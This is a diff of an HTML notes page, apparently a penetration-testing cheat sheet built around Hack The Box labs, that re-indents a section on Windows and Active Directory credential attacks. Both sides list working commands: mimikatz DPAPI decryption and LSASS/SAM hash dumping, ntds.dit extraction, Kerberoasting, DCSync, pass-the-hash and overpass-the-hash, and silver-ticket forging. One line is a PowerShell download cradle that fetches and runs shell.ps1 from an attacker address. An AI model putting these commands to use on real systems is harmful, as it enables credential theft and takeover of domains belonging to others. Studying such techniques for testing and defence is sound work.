@@ -1525,582 +1525,581 @@ layout: default
     
     <li>If credentials are cached then we can find the cleartext password using mimikatz</li>
     
-    <ul>
-        <table>
-            <tr>
-                <td>Master key</td>
-                <td>
-                    <li>Location - C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\&lt;GUID&gt;</li>
-                    <ul>
-                        <li>&lt;SID&gt; - Users security identifier</li>
-                        <li>&lt;GUID&gt; - Name of master key</li>
-                    </ul>
-                    <li>A user can have multiple master keys</li>
-                    <li>Master key can be decrypted using user's password or domain backup key</li>
-                    <li>A decrypted master key can be used to decrypt any DPAPI data blobs</li>
-                    <table>
-                        <tr>
-                            <td>Decrpyt using mimikatz</td>
-                            <td>dpapi::masterkey /in:&lt;master key file&gt; /sid:&lt;SID&gt; /password:&lt;password&gt;</td>
-                        </tr>
-                    </table>
-                </td>
-            </tr>
-            <tr>
-                <td>Encrypted Credential Manager Credentials</td>
-                <td>
-                    <li>User credential Location - C:\Users\&lt;USER&gt;\AppData\Local\Microsoft\Credentials\</li>
-                    <li>System credential location - %systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\</li>
-                    <table>
-                        <tr>
-                            <td>mimikatz decrypt file using master key</td>
-                            <td>
-                                <li># dpapi::cred /in:&lt;credential file&gt;</li>
-                                <ul>
-                                    <li>If ran after decrypting a master key the mimikatz will automatically apply it</li>
-                                </ul>
-                            </td>
-                        </tr>
-                    </table>
-                </td>
-            </tr>
-        </table>
-        
-        <li>Resources:</li>
-        <ul>
-            <li>https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/</li>
-            <li>HTB: Access</li>
-        </ul>
-    </ul>
-    
-    <hr>
-    
-    <h2>Security Identifier (SID)</h2>
-    
-    <li>Every account has one.</li>
-    <ul>
-        <li>There is a separate one for each account that is used for elevated privileges (UAC)</li>
-    </ul>
-    
-    <li>Windows refers to accounts by SIDs, people refer to accounts by account names</li>
-    <li>All SIDs start with S-1-5-21</li>
-    <ul>
-        <li>Admin always ends in 500</li>
-        <li>Guest always ends in 501</li>
-        <li>S-1-5-19 is the LocalSystem account</li>
-    </ul>
-    
-    <li>Example SID: S-1-5-21-1180699209-877415012-3182924384-1004</li>
     <table>
         <tr>
-            <td>S</td>
-            <td>1</td>
-            <td>5</td>
-            <td>21-1180699209-877415012-3182924384</td>
-            <td>1004</td>
-        </tr>
-        <tr>
-            <td>Indicates this is a SID</td>
-            <td>SID specification version number</td>
-            <td>Identifier authority</td>
-            <td>Domain or local computer identifier</td>
-            <td>Relative ID</td>
-        </tr>
-    </table>
-    
-    <hr>
-    
-    <h2>Dump Hashes</h2>
-    
-    <li>Dumped hash format</li>
-    <ul>
-        <li>Username:#:LM HASH:NTLM HASH:::</li>
-    </ul>
-    
-    <li>SAM, SYSTEM, and SECURITY Location</li>
-    <ul>
-        <li>C:\Windows\System32\config\</li>
-        <li>Backup Locations</li>
-        <ul>
-            <li>C:\Windows\System32\config\RegBack</li>
-            <li>C:\Windows\Repair</li>
-        </ul>
-        <li>reg save HKLM\&lt;file&gt; &lt;Out file&gt;</li>
-    </ul>
-    
-    <li>mimikatz</li>
-    <ul>
-        <li>Extracts hashes from the Local Security Authority Subsystem (LSASS)</li>
-        <li>Dump creds/hashes</li>
-        <ul>
-            <li>Summary</li>
-            <ul>
-                <li>privilege::debug</li>
-                <li>token::elevate</li>
-                <li>lsadump::sam</li>
-                <li>sekurlsa::logonpasswords</li>
-            </ul>
-            
-            <li>Explained/Detailed</li>
-            <ul>
-                <li>Mimikatz must be launched from an administrative command prompts</li>
-                <ul>
-                    <li>Must first execute two commands:</li>
-                    <ul>
-                        <li>privilege::debug – enables SeDebugPrivilege</li>
-                        <ul>
-                            <li>If fails, mimikatz was most likely not executed with admin privileges</li>
-                        </ul>
-                        
-                        <li>token::elevate</li>
-                        <ul>
-                            <li>Elevates mimikatz security token from administrator to SYSTEM</li>
-                            <li>If mimikatz is launched from a SYSTEM shell, this step can be skipped</li>
-                        </ul>
-                    </ul>
-                    
-                    <li>Dump SAM contents (Security Account Manager)</li>
-                    <ul>
-                        <li>lsadump::sam</li>
-                    </ul>
-                    
-                    <li>Dump NTLM hash</li>
-                    <ul>
-                        <li>sekurlsa::logonpasswords</li>
-                        <ul>
-                            <li>This will dump the credentials of all users currently logged into the workstation or server.</li>
-                            <ul>
-                                <li>Includes remote logins like RDP sessions</li>
-                            </ul>
-                            
-                            <li>If WDigest is enabled Mimikatz will reveal cleartext passwords alongside hashes (Windows 7)</li>
-                        </ul>
-                    </ul>
-                </ul>
-            </ul>
-        </ul>
-        
-        <li>ERROR kuhl_m_sekurlsa_acquireLSA; Key import</li>
-        <ul>
-            <li>Newer Windows update makes it so mimikatz versions 2.2.0 and newer do not work.  Must use an older version of mimikatz.</li>
-            <ul>
-                <li>https://gitlab.com/kalilinux/packages/mimikatz/-/tree/d72fc2cca1df23f60f81bc141095f65a131fd099/</li>
-            </ul>
-        </ul>
-    </ul>
-    
-    <li>Other tools such as samdump2, pwdump, fgdump, and Windows Credential Editor (wce) work well against older Windows OS's such as XP or Server 2003</li>
-    
-    <li>impacket-secretsdump</li>
-    <ul>
-        <li>Dump hashes locally</li>
-        <ul>
-            <li>impacket-secretsdump -sam &lt;SAM file&gt; -security &lt;SECURITY file&gt; [-system &lt;SYSTEM file&gt;] LOCAL</li>
-        </ul>
-    </ul>
-    
-    <hr>
-    
-    <h2>Active Directory</h2>
-    
-    <li>Authentication</li>
-    <ul>
-        <li>NTLM</li>
-        <ul>
-            <li>Used when clients authenticate to a server by IP (instead of hostname) or if a user attempts to authenticate to a hostname that is not registered on the AD DNS server.  3rd party applications can also choose NTLM instead of Kerberos.</li>
-            <li>NTLM hashes can be cracked very quickly</li>
-        </ul>
-        <li>Kerberos</li>
-    </ul>
-    
-    <li>ntds.dit file</li>
-    <ul>
-        <li>Database stored on DC that contains all active directory information including password hashes for all users in the domain</li>
-        <li>C:\windows\ntds\</li>
-        <li>Can use SYSTEM file to decrypt the ntds.dit and extract all the information from it</li>
-        <ul>
-            <li>impacket-secretsdump -ntds &lt;ntds.dit file&gt; -system &lt;SYSTEM file&gt; [-security &lt;SECURITY file&gt;] LOCAL</li>
-            <ul>
-                <li>Additional Useful flags:</li>
-                <ul>
-                    <table>
-                        <tr>
-                            <td>-pwd-last-set</td>
-                            <td>If user has multiple accounts and changes password in same timeframe then likey all passwords are the same </td>
-                        </tr>
-                        <tr>
-                            <td>-user-status</td>
-                            <td>Tells if the account is disabled or not</td>
-                        </tr>
-                        <tr>
-                            <td>-history</td>
-                            <td>Windows will show the last 24 used passwords for each user</td>
-                        </tr>
-                    </table>
-                </ul>
-                
-                <li>Grep the ntds dump</li>
-                <ul>
-                    <li>grep -v &apos;aes[12]\|des-cbc</li>
-                    <li>grep -v history0</li>
-                </ul>
-            </ul>
-        </ul>
-    </ul>
-    
-    <li>Brute force valid users amd pre-auth attack</li>
-    <ul>
-        <li>kerbrute</li>
-        <ul>
-            <li>pre-auth attack tool.  Will validate user existence.</li>
-            <li>Can lock out users but will not generate 4625 event code which is logged by default.  The event code it does generate is not logged by default.</li>
-            <li>kerberute userenum --dc apt -d &lt;domain&gt; &lt;user list&gt;</li>
-        </ul>
-    </ul>
-    
-    <li>Kerberoast</li>
-    <ul>
-        <li>Mimikatz/manual</li>
-        <table>
-            <tr>
-                <td>Purge all current tickets</td>
-                <td>kerberos::purge</td>
-            </tr>
-            <tr>
-                <td>Enumerate SPNs</td>
-                <td>GetUserSPNs.ps1</td>
-            </tr>
-            <tr>
-                <td>Request security token for SPN</td>
-                <td>
-                    <li>Add-Type -AssemblyName System.IdentityModel</li>
-                    <li>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &#039;&lt;SPN - Example:HTTP/CorpWebServer.corp.com&gt;'</li>
-                </td>
-            </tr>
-            <tr>
-                <td>export TGS ticket</td>
-                <td>kereberos::list /export or PS &gt; klist</td>
-            </tr>
-            <tr>
-                <td>Turn output into hashcat hash</td>
-                <td>kirbi2hashcat</td>
-            </tr>
-        </table>
-        
-        <li>Rubeus</li>
-        <ul>
-            <li>.\r.exe kerberoast /creduser:domain\&lt;user&gt; /credpassword:&lt;password&gt;</li>
-        </ul>
-        
-        <li>GetUserSPNs.py</li>
-        <table>
-            <tr>
-                <td>Forward port 88 & 389 to Kali</td>
-                <td>chisel.exe client 10.10.14.4:8008 R:88:127.0.0.1:88 R:389:localhost:389</td>
-            </tr>
-            <tr>
-                <td>Get hash for kerberoastable users</td>
-                <td>GetUserSPNs.py -request -dc-ip 127.0.0.1 &lt;domain&gt;/&lt;user&gt;</td>
-            </tr>
-        </table>
-    </ul>
-    
-    <li>DCSync</li>
-    <ul>
-        <li>Retrieve all domain password data via domain replication protocols.</li>
-        <li>Tools/Methods</li>
-        <ul>
-            <li>Impacket-SecretsDump &#039;&lt;username&gt;:&lt;password&gt;@&lt;ip address&gt;&#039;</li>
-            <ul>
-                <li>Attack remotely.  Generates network traffic.  Does not have to deal with AV or other problems on victim machine.</li>
-            </ul>
-            <li>.\Mimikatz.exe 'lsadump::dcsync /domain:&lt;domain name&gt; /user:administrator&#039; exit</li>
-            <ul>
-                <li>Attack locally.  Reduced network traffic.</li>
-            </ul>
-        </ul>
-    </ul>
-    
-    <li>Brute force credentials with smb and winrm</li>
-    <ul>
-        <li>crackmapexec winrm/smb -u &lt;username&gt; -p &lt;password&gt; or -H &lt;hash&gt;</li>
-        <ul>
-            <li>SMB brute forcing can be detected and banned by some AD setups</li>
-        </ul>
-    </ul>
-    
-    <li>Enumerating AD Users and Groups</li>
-    <table>
-        <tr>
-            <td>net user</td>
-            <td>Shows local user accounts</td>
-        </tr>
-        <tr>
-            <td>net user /domain</td>
-            <td>Shows all domain user accounts</td>
-        </tr>
-        <tr>
-            <td>net user &lt;user&gt; /domain</td>
-            <td>Shows all domain user accounts</td>
-        </tr>
-        <tr>
-            <td>net group /domain</td>
-            <td>Shows all groups on the domain</td>
-        </tr>
-    </table>
-    
-    <li>Fix clock skew</li>
-    <ul>
-        <li>Check clock skew</li>
-        <ul>
-            <li>nmap</li>
-            <ul>
-                <li>sudo nmap -p445 -sV -sC &lt;ip address&gt;</li>
-                <li>Look for clock-skew: mean: &lt;value&gt; deviation: &lt;clock skew time&gt; median: &lt;value&gt;</li>
-            </ul>
-        </ul>
-        
-        <li>Check local time (on Kali)</li>
-        <ul>
-            <li>date</li>
-        </ul>
-        
-        <li>Change local time (on Kali)</li>
-        <ul>
-            <li>date -s &lt;Time&gt;</li>
-            <ul>
-                <li>&lt;Time&gt; Format</li>
-                <ul>
-                    <li>HH:MM:SS</li>
-                </ul>
-            </ul>
-        </ul>
-    </ul>
-    
-    <hr>
-    
-    <h2>Credential Usage</h2>
-    
-    <table>
-        <tr>
+            <td>Master key</td>
             <td>
-                <li>impacket-psexec</li>
+                <li>Location - C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\&lt;GUID&gt;</li>
                 <ul>
-                    <li>If user has ability to write to a SMB share</li>
+                    <li>&lt;SID&gt; - Users security identifier</li>
+                    <li>&lt;GUID&gt; - Name of master key</li>
                 </ul>
-                <li>impacket-wmiexec uses same syntax</li>
-                <ul>
-                    <li>wmiexec does not require writing to SMB</li>
-                </ul>
-            </td>
-            <td>
-                <li>impacket-psexec &lt;username&gt;@&lt;ip address&gt; -hashes LM:NTLM</li>
-                <li>impacket-psexec &lt;username&gt;:&lt;password&gt;@&lt;ip address&gt;</li>
-                <li>impacket-psexec &lt;username&gt;@&lt;ip address&gt;</li>
-                <ul>
-                    <li>Will prompt for password.  Works when password has bad characters that are throwing off the command.</li>
-                </ul>
-            </td>
-        </tr>
-        <tr>
-            <td>
-                <li>Run powershell command as other user</li>
-            </td>
-            <td>
+                <li>A user can have multiple master keys</li>
+                <li>Master key can be decrypted using user's password or domain backup key</li>
+                <li>A decrypted master key can be used to decrypt any DPAPI data blobs</li>
                 <table>
                     <tr>
-                        <td>Method 1</td>
-                        <td>Start-Process -FilePath &quot;powershell&quot; -argumentlist &quot;IEX(New-Object Net.WebClient).downloadString(&apos;http://&lt;ip address&gt;/shell.ps1&apos;)&quot; -Credential $cred</td>
-                    </tr>
-                    <tr>
-                        <td>Method 2</td>
-                        <td>Invoke-Command -ComputerName &lt;computer name&gt; -Credential $cred -ScriptBlock {whoami}</td>
-                    </tr>
-                    <tr>
-                        <td>Method 3</td>
-                        <td>
-                            <li>Powershell-Suite/Runas.ps1</li>
-                            <li>Invoke-RunAs -User &lt;username&gt; -Password &lt;password&gt; -LogonType &lt;0x1 or 0x2&gt; -Binary powershell.exe -Args &lt;powershell command&gt;</li>
-                        </td>
+                        <td>Decrpyt using mimikatz</td>
+                        <td>dpapi::masterkey /in:&lt;master key file&gt; /sid:&lt;SID&gt; /password:&lt;password&gt;</td>
                     </tr>
                 </table>
             </td>
         </tr>
         <tr>
-            <td>Pass the hash</td>
+            <td>Encrypted Credential Manager Credentials</td>
             <td>
-                <li>pth-winexe - Pass the hash</li>
-                <ul>
-                    <li>Used to authenticate via the SMB protocol</li>
-                    <li>Example: pth-winexe &ndash;U &lt;username&gt;%&lt;hash - Must be formatted LM_Hash:NT_Hash&gt; //&lt;ip address&gt; cmd</li>
-                </ul>
-            </td>
-        </tr>
-        <tr>
-            <td>
-                <li>winexe - password</li>
-            </td>
-            <td>
-                <li>winexe -U &#039;&lt;username&gt;%&lt;password&gt;&#039; //&lt;ip address&gt; cmd.exe</li>
-                <li>winexe -U &#039;&lt;username&gt;%&lt;password&gt;&#039; --system //&lt;ip address&gt; cmd.exe</li>
-            </td>
-        </tr>
-        <tr>
-            <td>evil-winrm</td>
-            <td>
-                <li>evil-winrm -i &lt;ip address&gt; -u &lt;user&gt; -p &lt;password&gt;</li>
-                <li>evil-winrm -i &lt;ip address&gt; -u &lt;user&gt; -H &lt;NTLM&gt;</li>
+                <li>User credential Location - C:\Users\&lt;USER&gt;\AppData\Local\Microsoft\Credentials\</li>
+                <li>System credential location - %systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\</li>
+                <table>
+                    <tr>
+                        <td>mimikatz decrypt file using master key</td>
+                        <td>
+                            <li># dpapi::cred /in:&lt;credential file&gt;</li>
+                            <ul>
+                                <li>If ran after decrypting a master key the mimikatz will automatically apply it</li>
+                            </ul>
+                        </td>
+                    </tr>
+                </table>
             </td>
         </tr>
     </table>
     
-    <hr>
-    
-    <h2>Overpass the Hash</h2>
-    
-    <li>Turn NTLM hash into Kerberos ticket to avoid the use of NTLM authentication</li>
+    <li>Resources:</li>
     <ul>
-        <li>Retrieve NTLM hash for user</li>
-        <ul>
-            <li>Mimikatz</li>
-            <ul>
-                <li>Privilege::debug</li>
-                <li>Sekurlsa::logonpasswords</li>
-            </ul>
-        </ul>
-        
-        <li>Authenticate with NTLM hash – Powershell session under context of other user</li>
-        <ul>
-            <li>Mimikatz</li>
-            <ul>
-                <li>Sekurlsa::pth /user:&lt;username&gt; /domain:&lt;domain &ndash; ex. Corp.com&gt; /ntlm:&lt;NTLM hash&gt; /run:powershell.exe</li>
-            </ul>
-        </ul>
-        <li>Generate TGT by authenticating to a network share on DC – can use any command that requires domain permissions</li>
-        <ul>
-            <li>Net use \\&lt;Domain Controller &ndash; ex. dc01&gt;</li>
-        </ul>
-        <li>Check for cached Kerberos ticket</li>
-        <ul>
-            <li>Klist</li>
-        </ul>
-        <li>Run PsExec inside powershell session that is running under context of other user</li>
-        <ul>
-            <li>.\PsExec.exe \\&lt;domain controller &ndash; ex. dc01&gt; cmd.exe</li>
-        </ul>
+        <li>https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/</li>
+        <li>HTB: Access</li>
     </ul>
-    
-    <hr>
-    
-    <h2>Silver Ticket</h2>
-    <li>Forge TGS using a service account password or NTLM hash in order to access any resources that the service account has permissions to</li>
-    <li>If the SPN is used on multiple servers the ticket can be leveraged against them all.</li>
-    <li>Creation Instructions</li>
+</ul>
+
+<hr>
+
+<h2>Security Identifier (SID)</h2>
+
+<li>Every account has one.</li>
+<ul>
+    <li>There is a separate one for each account that is used for elevated privileges (UAC)</li>
+</ul>
+
+<li>Windows refers to accounts by SIDs, people refer to accounts by account names</li>
+<li>All SIDs start with S-1-5-21</li>
+<ul>
+    <li>Admin always ends in 500</li>
+    <li>Guest always ends in 501</li>
+    <li>S-1-5-19 is the LocalSystem account</li>
+</ul>
+
+<li>Example SID: S-1-5-21-1180699209-877415012-3182924384-1004</li>
+<table>
+    <tr>
+        <td>S</td>
+        <td>1</td>
+        <td>5</td>
+        <td>21-1180699209-877415012-3182924384</td>
+        <td>1004</td>
+    </tr>
+    <tr>
+        <td>Indicates this is a SID</td>
+        <td>SID specification version number</td>
+        <td>Identifier authority</td>
+        <td>Domain or local computer identifier</td>
+        <td>Relative ID</td>
+    </tr>
+</table>
+
+<hr>
+
+<h2>Dump Hashes</h2>
+
+<li>Dumped hash format</li>
+<ul>
+    <li>Username:#:LM HASH:NTLM HASH:::</li>
+</ul>
+
+<li>SAM, SYSTEM, and SECURITY Location</li>
+<ul>
+    <li>C:\Windows\System32\config\</li>
+    <li>Backup Locations</li>
     <ul>
-        <li>Get domain SID</li>
+        <li>C:\Windows\System32\config\RegBack</li>
+        <li>C:\Windows\Repair</li>
+    </ul>
+    <li>reg save HKLM\&lt;file&gt; &lt;Out file&gt;</li>
+</ul>
+
+<li>mimikatz</li>
+<ul>
+    <li>Extracts hashes from the Local Security Authority Subsystem (LSASS)</li>
+    <li>Dump creds/hashes</li>
+    <ul>
+        <li>Summary</li>
         <ul>
-            <li>Whoami /user</li>
-            <ul>
-                <li>SID is everything except the last section of digits</li>
-            </ul>
+            <li>privilege::debug</li>
+            <li>token::elevate</li>
+            <li>lsadump::sam</li>
+            <li>sekurlsa::logonpasswords</li>
         </ul>
         
-        <li>mimikatz</li>
+        <li>Explained/Detailed</li>
         <ul>
-            <li>Get rid of pre-existing kerberos tickets</li>
+            <li>Mimikatz must be launched from an administrative command prompts</li>
             <ul>
-                <li>Kerberos::purge</li>
-            </ul>
-            
-            <li>Verify Kerberos tickets are purged</li>
-            <ul>
-                <li>Kerberos::list</li>
-            </ul>
-            
-            <li>Forge silver ticket</li>
-            <ul>
-                <li>Kerberos::golden /user:&lt;username&gt; /domain:&lt;domain ex. corp.com&gt; /sid:&lt;domain SID &ndash; whoami /user SID except last section of #&#039;s&gt; target:&lt;fully qualified host name of service &ndash; ex. CorpWebServer.corp.com&gt; /service:&lt;service type &ndash; ex. HTTP&gt; /rc4:&lt;service account hash&gt; /ppt (inject into memory)</li>
+                <li>Must first execute two commands:</li>
                 <ul>
-                    <li>Rc4/hash section requires knowledge of service account password.  If password is known, we can hash it.</li>
+                    <li>privilege::debug – enables SeDebugPrivilege</li>
+                    <ul>
+                        <li>If fails, mimikatz was most likely not executed with admin privileges</li>
+                    </ul>
+                    
+                    <li>token::elevate</li>
+                    <ul>
+                        <li>Elevates mimikatz security token from administrator to SYSTEM</li>
+                        <li>If mimikatz is launched from a SYSTEM shell, this step can be skipped</li>
+                    </ul>
+                </ul>
+                
+                <li>Dump SAM contents (Security Account Manager)</li>
+                <ul>
+                    <li>lsadump::sam</li>
+                </ul>
+                
+                <li>Dump NTLM hash</li>
+                <ul>
+                    <li>sekurlsa::logonpasswords</li>
+                    <ul>
+                        <li>This will dump the credentials of all users currently logged into the workstation or server.</li>
+                        <ul>
+                            <li>Includes remote logins like RDP sessions</li>
+                        </ul>
+                        
+                        <li>If WDigest is enabled Mimikatz will reveal cleartext passwords alongside hashes (Windows 7)</li>
+                    </ul>
                 </ul>
             </ul>
         </ul>
-        <li>Verify ticket has been created</li>
+    </ul>
+    
+    <li>ERROR kuhl_m_sekurlsa_acquireLSA; Key import</li>
+    <ul>
+        <li>Newer Windows update makes it so mimikatz versions 2.2.0 and newer do not work.  Must use an older version of mimikatz.</li>
+        <ul>
+            <li>https://gitlab.com/kalilinux/packages/mimikatz/-/tree/d72fc2cca1df23f60f81bc141095f65a131fd099/</li>
+        </ul>
+    </ul>
+</ul>
+
+<li>Other tools such as samdump2, pwdump, fgdump, and Windows Credential Editor (wce) work well against older Windows OS's such as XP or Server 2003</li>
+
+<li>impacket-secretsdump</li>
+<ul>
+    <li>Dump hashes locally</li>
+    <ul>
+        <li>impacket-secretsdump -sam &lt;SAM file&gt; -security &lt;SECURITY file&gt; [-system &lt;SYSTEM file&gt;] LOCAL</li>
+    </ul>
+</ul>
+
+<hr>
+
+<h2>Active Directory</h2>
+
+<li>Authentication</li>
+<ul>
+    <li>NTLM</li>
+    <ul>
+        <li>Used when clients authenticate to a server by IP (instead of hostname) or if a user attempts to authenticate to a hostname that is not registered on the AD DNS server.  3rd party applications can also choose NTLM instead of Kerberos.</li>
+        <li>NTLM hashes can be cracked very quickly</li>
+    </ul>
+    <li>Kerberos</li>
+</ul>
+
+<li>ntds.dit file</li>
+<ul>
+    <li>Database stored on DC that contains all active directory information including password hashes for all users in the domain</li>
+    <li>C:\windows\ntds\</li>
+    <li>Can use SYSTEM file to decrypt the ntds.dit and extract all the information from it</li>
+    <ul>
+        <li>impacket-secretsdump -ntds &lt;ntds.dit file&gt; -system &lt;SYSTEM file&gt; [-security &lt;SECURITY file&gt;] LOCAL</li>
+        <ul>
+            <li>Additional Useful flags:</li>
+            <ul>
+                <table>
+                    <tr>
+                        <td>-pwd-last-set</td>
+                        <td>If user has multiple accounts and changes password in same timeframe then likey all passwords are the same </td>
+                    </tr>
+                    <tr>
+                        <td>-user-status</td>
+                        <td>Tells if the account is disabled or not</td>
+                    </tr>
+                    <tr>
+                        <td>-history</td>
+                        <td>Windows will show the last 24 used passwords for each user</td>
+                    </tr>
+                </table>
+            </ul>
+            
+            <li>Grep the ntds dump</li>
+            <ul>
+                <li>grep -v &apos;aes[12]\|des-cbc</li>
+                <li>grep -v history0</li>
+            </ul>
+        </ul>
+    </ul>
+</ul>
+
+<li>Brute force valid users amd pre-auth attack</li>
+<ul>
+    <li>kerbrute</li>
+    <ul>
+        <li>pre-auth attack tool.  Will validate user existence.</li>
+        <li>Can lock out users but will not generate 4625 event code which is logged by default.  The event code it does generate is not logged by default.</li>
+        <li>kerberute userenum --dc apt -d &lt;domain&gt; &lt;user list&gt;</li>
+    </ul>
+</ul>
+
+<li>Kerberoast</li>
+<ul>
+    <li>Mimikatz/manual</li>
+    <table>
+        <tr>
+            <td>Purge all current tickets</td>
+            <td>kerberos::purge</td>
+        </tr>
+        <tr>
+            <td>Enumerate SPNs</td>
+            <td>GetUserSPNs.ps1</td>
+        </tr>
+        <tr>
+            <td>Request security token for SPN</td>
+            <td>
+                <li>Add-Type -AssemblyName System.IdentityModel</li>
+                <li>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &#039;&lt;SPN - Example:HTTP/CorpWebServer.corp.com&gt;'</li>
+            </td>
+        </tr>
+        <tr>
+            <td>export TGS ticket</td>
+            <td>kereberos::list /export or PS &gt; klist</td>
+        </tr>
+        <tr>
+            <td>Turn output into hashcat hash</td>
+            <td>kirbi2hashcat</td>
+        </tr>
+    </table>
+    
+    <li>Rubeus</li>
+    <ul>
+        <li>.\r.exe kerberoast /creduser:domain\&lt;user&gt; /credpassword:&lt;password&gt;</li>
+    </ul>
+    
+    <li>GetUserSPNs.py</li>
+    <table>
+        <tr>
+            <td>Forward port 88 & 389 to Kali</td>
+            <td>chisel.exe client 10.10.14.4:8008 R:88:127.0.0.1:88 R:389:localhost:389</td>
+        </tr>
+        <tr>
+            <td>Get hash for kerberoastable users</td>
+            <td>GetUserSPNs.py -request -dc-ip 127.0.0.1 &lt;domain&gt;/&lt;user&gt;</td>
+        </tr>
+    </table>
+</ul>
+
+<li>DCSync</li>
+<ul>
+    <li>Retrieve all domain password data via domain replication protocols.</li>
+    <li>Tools/Methods</li>
+    <ul>
+        <li>Impacket-SecretsDump &#039;&lt;username&gt;:&lt;password&gt;@&lt;ip address&gt;&#039;</li>
+        <ul>
+            <li>Attack remotely.  Generates network traffic.  Does not have to deal with AV or other problems on victim machine.</li>
+        </ul>
+        <li>.\Mimikatz.exe 'lsadump::dcsync /domain:&lt;domain name&gt; /user:administrator&#039; exit</li>
+        <ul>
+            <li>Attack locally.  Reduced network traffic.</li>
+        </ul>
+    </ul>
+</ul>
+
+<li>Brute force credentials with smb and winrm</li>
+<ul>
+    <li>crackmapexec winrm/smb -u &lt;username&gt; -p &lt;password&gt; or -H &lt;hash&gt;</li>
+    <ul>
+        <li>SMB brute forcing can be detected and banned by some AD setups</li>
+    </ul>
+</ul>
+
+<li>Enumerating AD Users and Groups</li>
+<table>
+    <tr>
+        <td>net user</td>
+        <td>Shows local user accounts</td>
+    </tr>
+    <tr>
+        <td>net user /domain</td>
+        <td>Shows all domain user accounts</td>
+    </tr>
+    <tr>
+        <td>net user &lt;user&gt; /domain</td>
+        <td>Shows all domain user accounts</td>
+    </tr>
+    <tr>
+        <td>net group /domain</td>
+        <td>Shows all groups on the domain</td>
+    </tr>
+</table>
+
+<li>Fix clock skew</li>
+<ul>
+    <li>Check clock skew</li>
+    <ul>
+        <li>nmap</li>
+        <ul>
+            <li>sudo nmap -p445 -sV -sC &lt;ip address&gt;</li>
+            <li>Look for clock-skew: mean: &lt;value&gt; deviation: &lt;clock skew time&gt; median: &lt;value&gt;</li>
+        </ul>
+    </ul>
+    
+    <li>Check local time (on Kali)</li>
+    <ul>
+        <li>date</li>
+    </ul>
+    
+    <li>Change local time (on Kali)</li>
+    <ul>
+        <li>date -s &lt;Time&gt;</li>
+        <ul>
+            <li>&lt;Time&gt; Format</li>
+            <ul>
+                <li>HH:MM:SS</li>
+            </ul>
+        </ul>
+    </ul>
+</ul>
+
+<hr>
+
+<h2>Credential Usage</h2>
+
+<table>
+    <tr>
+        <td>
+            <li>impacket-psexec</li>
+            <ul>
+                <li>If user has ability to write to a SMB share</li>
+            </ul>
+            <li>impacket-wmiexec uses same syntax</li>
+            <ul>
+                <li>wmiexec does not require writing to SMB</li>
+            </ul>
+        </td>
+        <td>
+            <li>impacket-psexec &lt;username&gt;@&lt;ip address&gt; -hashes LM:NTLM</li>
+            <li>impacket-psexec &lt;username&gt;:&lt;password&gt;@&lt;ip address&gt;</li>
+            <li>impacket-psexec &lt;username&gt;@&lt;ip address&gt;</li>
+            <ul>
+                <li>Will prompt for password.  Works when password has bad characters that are throwing off the command.</li>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            <li>Run powershell command as other user</li>
+        </td>
+        <td>
+            <table>
+                <tr>
+                    <td>Method 1</td>
+                    <td>Start-Process -FilePath &quot;powershell&quot; -argumentlist &quot;IEX(New-Object Net.WebClient).downloadString(&apos;http://&lt;ip address&gt;/shell.ps1&apos;)&quot; -Credential $cred</td>
+                </tr>
+                <tr>
+                    <td>Method 2</td>
+                    <td>Invoke-Command -ComputerName &lt;computer name&gt; -Credential $cred -ScriptBlock {whoami}</td>
+                </tr>
+                <tr>
+                    <td>Method 3</td>
+                    <td>
+                        <li>Powershell-Suite/Runas.ps1</li>
+                        <li>Invoke-RunAs -User &lt;username&gt; -Password &lt;password&gt; -LogonType &lt;0x1 or 0x2&gt; -Binary powershell.exe -Args &lt;powershell command&gt;</li>
+                    </td>
+                </tr>
+            </table>
+        </td>
+    </tr>
+    <tr>
+        <td>Pass the hash</td>
+        <td>
+            <li>pth-winexe - Pass the hash</li>
+            <ul>
+                <li>Used to authenticate via the SMB protocol</li>
+                <li>Example: pth-winexe &ndash;U &lt;username&gt;%&lt;hash - Must be formatted LM_Hash:NT_Hash&gt; //&lt;ip address&gt; cmd</li>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            <li>winexe - password</li>
+        </td>
+        <td>
+            <li>winexe -U &#039;&lt;username&gt;%&lt;password&gt;&#039; //&lt;ip address&gt; cmd.exe</li>
+            <li>winexe -U &#039;&lt;username&gt;%&lt;password&gt;&#039; --system //&lt;ip address&gt; cmd.exe</li>
+        </td>
+    </tr>
+    <tr>
+        <td>evil-winrm</td>
+        <td>
+            <li>evil-winrm -i &lt;ip address&gt; -u &lt;user&gt; -p &lt;password&gt;</li>
+            <li>evil-winrm -i &lt;ip address&gt; -u &lt;user&gt; -H &lt;NTLM&gt;</li>
+        </td>
+    </tr>
+</table>
+
+<hr>
+
+<h2>Overpass the Hash</h2>
+
+<li>Turn NTLM hash into Kerberos ticket to avoid the use of NTLM authentication</li>
+<ul>
+    <li>Retrieve NTLM hash for user</li>
+    <ul>
+        <li>Mimikatz</li>
+        <ul>
+            <li>Privilege::debug</li>
+            <li>Sekurlsa::logonpasswords</li>
+        </ul>
+    </ul>
+    
+    <li>Authenticate with NTLM hash – Powershell session under context of other user</li>
+    <ul>
+        <li>Mimikatz</li>
+        <ul>
+            <li>Sekurlsa::pth /user:&lt;username&gt; /domain:&lt;domain &ndash; ex. Corp.com&gt; /ntlm:&lt;NTLM hash&gt; /run:powershell.exe</li>
+        </ul>
+    </ul>
+    <li>Generate TGT by authenticating to a network share on DC – can use any command that requires domain permissions</li>
+    <ul>
+        <li>Net use \\&lt;Domain Controller &ndash; ex. dc01&gt;</li>
+    </ul>
+    <li>Check for cached Kerberos ticket</li>
+    <ul>
+        <li>Klist</li>
+    </ul>
+    <li>Run PsExec inside powershell session that is running under context of other user</li>
+    <ul>
+        <li>.\PsExec.exe \\&lt;domain controller &ndash; ex. dc01&gt; cmd.exe</li>
+    </ul>
+</ul>
+
+<hr>
+
+<h2>Silver Ticket</h2>
+<li>Forge TGS using a service account password or NTLM hash in order to access any resources that the service account has permissions to</li>
